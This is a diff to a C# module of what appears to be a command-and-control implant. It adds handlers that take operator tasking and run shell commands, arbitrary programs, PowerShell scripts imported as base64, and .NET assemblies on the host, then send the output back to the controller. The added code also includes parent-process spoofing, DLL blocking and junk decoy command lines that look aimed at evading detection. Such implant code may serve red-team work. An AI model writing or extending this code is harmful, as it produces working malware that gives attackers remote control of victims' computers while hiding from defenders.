@@ -1,6 +1,7 @@
 ﻿using Agent.Controllers;
 using Agent.Interfaces;
 using Agent.Models;
+using Agent.Utilities;
 
 using Shared.Models;
 
@@ -19,6 +20,7 @@ namespace Agent.Modules
         ConfigController Config;
 
         Assembly CurrentAssembly;
+        byte[] CurrentPowerShell;
 
         public void Init(AgentController Agent, ConfigController Config)
         {
@@ -55,6 +57,11 @@ namespace Agent.Modules
                     },
                     new ModuleInfo.Command
                     {
+                        Name = "ImportPowerShell",
+                        Delegate = ImportPowerShell
+                    },
+                    new ModuleInfo.Command
+                    {
                         Name = "Assembly",
                         Delegate = ExecuteAssembly
                     },
@@ -76,7 +83,16 @@ namespace Agent.Modules
         {
             try
             {
-                
+                var ppid = Config.Get<int>(AgentConfig.PPID);
+                var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);
+
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var arguments = (string)parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
+
+                var lamb = new SacrificialLamb(ppid, blockdlls);
+                var result = lamb.Shell("klasdjflasdkjflsadjflsadjflskdajflsjdfljdslfjsdlafjlsjdflsjadflsjdlfkj", $"/c {arguments}");
+
+                Agent.SendMessage(result);
             }
             catch (Exception e)
             {
@@ -88,7 +104,23 @@ namespace Agent.Modules
         {
             try
             {
+                var ppid = Config.Get<int>(AgentConfig.PPID);
+                var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);
 
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+
+                var command = (string)parameters.FirstOrDefault(p => p.Name.Equals("Command", StringComparison.OrdinalIgnoreCase)).Value;
+                var arguments = parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
+
+                if (arguments == null)
+                {
+                    arguments = string.Empty;
+                }
+
+                var lamb = new SacrificialLamb(ppid, blockdlls);
+                var result = lamb.Run(command, "lskdajflaksdjflasjdflkjadslkfjlaksdjfljdsalfjdlsakjfljasdlfj", (string)arguments);
+
+                Agent.SendMessage(result);
             }
             catch (Exception e)
             {
@@ -100,7 +132,16 @@ namespace Agent.Modules
         {
             try
             {
+                var ppid = Config.Get<int>(AgentConfig.PPID);
+                var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);
 
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var arguments = (string)parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
+
+                var lamb = new SacrificialLamb(ppid, blockdlls);
+                var result = lamb.PowerShell("klasdjflasdkjflsadjflsadjflskdajflsjdfljdslfjsdlafjlsjdflsjadflsjdlfkj", $"-c \"{arguments}\"");
+
+                Agent.SendMessage(result);
             }
             catch (Exception e)
             {
@@ -112,7 +153,19 @@ namespace Agent.Modules
         {
             try
             {
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var arguments = (string)parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
 
+                using (var runner = new PowerShellRunner())
+                {
+                    if (CurrentPowerShell.Length > 0)
+                    {
+                        runner.ImportScript(Encoding.UTF8.GetString(CurrentPowerShell));
+                    }
+
+                    var result = runner.InvokePS(arguments);
+                    Agent.SendMessage(result);
+                }
             }
             catch (Exception e)
             {
@@ -146,7 +199,7 @@ namespace Agent.Modules
                 }
                 else
                 {
-                    arguments = ((string)arguments).Split(' ');
+                    arguments = new string[] { arguments as string };
                 }
 
                 asm.EntryPoint.Invoke(null, new object[] { arguments });
@@ -187,6 +240,14 @@ namespace Agent.Modules
                 Agent.SendError(e.Message);
             }
             
+        }
+
+        void ImportPowerShell(string AgentID, C2Data C2Data)
+        {
+            var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+            CurrentPowerShell = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Script", StringComparison.OrdinalIgnoreCase)).Value);
+
+            Agent.SendMessage($"Imported {CurrentPowerShell.Length} bytes.");
         }
 
         void ExecuteAssemblyMethod(string AgentID, C2Data C2Data)
